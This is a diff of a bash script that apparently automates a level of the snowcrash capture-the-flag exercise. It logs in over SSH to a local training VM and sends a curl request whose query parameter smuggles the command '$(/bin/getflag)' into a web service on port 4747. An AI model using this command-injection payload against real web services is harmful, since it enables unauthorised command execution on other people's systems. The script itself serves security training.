@@ -120,14 +120,15 @@ main() {
     host="localhost";
     port="4242"; # cf. port forwarding to VM 4242 => 4242.
 
-    level03_socket_path=$(get_ssh_socket_path "snowcrash_level03_socket") || exit 1;
-    level03_username="level03";
-    level03_password=$(cat "$CURR_DIR_PATH/../../level02/flag");
+    level04_socket_path=$(get_ssh_socket_path "snowcrash_level04_socket") || exit 1;
+    level04_username="level04";
+    level04_password=$(cat "$CURR_DIR_PATH/../../level03/flag");
 
-    trap 'close_ssh_socket "$level03_socket_path" "$host" "$port" "$level03_username"' EXIT USR1;
-    init_ssh_socket "$level03_socket_path" "$host" "$port" "$level03_username" "$level03_password";
-    checkflag=$(ssh_exec_via_socket "$level03_socket_path" "$host" "$port" "$level03_username" "curl -s 'localhost:4747/?x=\$(/bin/getflag)'" | head -n 1 | awk '{ print $NF }');
-    kill -USR1 $$;
+    trap 'close_ssh_socket "$level04_socket_path" "$host" "$port" "$level04_username"' EXIT;
+    init_ssh_socket "$level04_socket_path" "$host" "$port" "$level04_username" "$level04_password";
+    checkflag=$(ssh_exec_via_socket "$level04_socket_path" "$host" "$port" "$level04_username" "curl -s 'localhost:4747/?x=\$(/bin/getflag)'" | head -n 1 | awk '{ print $NF }');
+    close_ssh_socket "$level04_socket_path" "$host" "$port" "$level04_username";
+
 
     flag_outpath="$CURR_DIR_PATH/../flag";
     echo "Checkflag: $checkflag";
